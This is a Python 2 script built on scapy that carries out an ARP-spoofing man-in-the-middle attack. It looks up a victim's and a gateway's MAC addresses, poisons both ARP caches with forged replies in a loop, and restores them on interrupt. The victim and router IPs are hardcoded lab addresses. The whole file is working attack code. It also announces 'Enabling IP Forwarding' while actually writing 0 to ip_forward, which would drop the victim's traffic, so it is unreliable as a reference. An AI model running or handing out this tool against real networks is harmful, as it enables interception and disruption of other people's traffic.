from scapy.all import *
import sys, os, time

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")
	#endfor
#enddef

def reARP():
	print "\n[*] Restoring Targets..."
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print "[*] Disabling IP Forwarding..."
	forward_ip(0)
	print "[*] Shutting Down..."
	sys.exit(1)
#enddef

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))
#enddef

def forward_ip(i):
	os.system("echo " + str(i) + " > /proc/sys/net/ipv4/ip_forward")
#enddef

def mitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		forward_ip(0)
		print "[!] Couldn't Find Victim MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	#endtry
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		forward_ip(0)
		print "[!] Couldn't Find Gateway MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	#endtry

	print "[*] Poisoning Targets..."

	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break
		#endtry
	#endwhile
#enddef

if __name__ == '__main__':
	try:
		# interface = raw_input("[*] Enter Desired Interface: ")
		# victimIP = raw_input("[*] Enter Victim IP: ")
		# gateIP = raw_input("[*] Enter Router IP: ")
		interface = "eth0"
		victimIP = "10.0.2.4"
		gateIP = "10.0.2.2"
	except KeyboardInterrupt:
		print "\n[*] User Requested Shutdown"
		print "[*] Exiting..."
		sys.exit(1)
	#endtry
	
	print "\n[*] Enabling IP Forwarding...\n"

	forward_ip(0)
	mitm()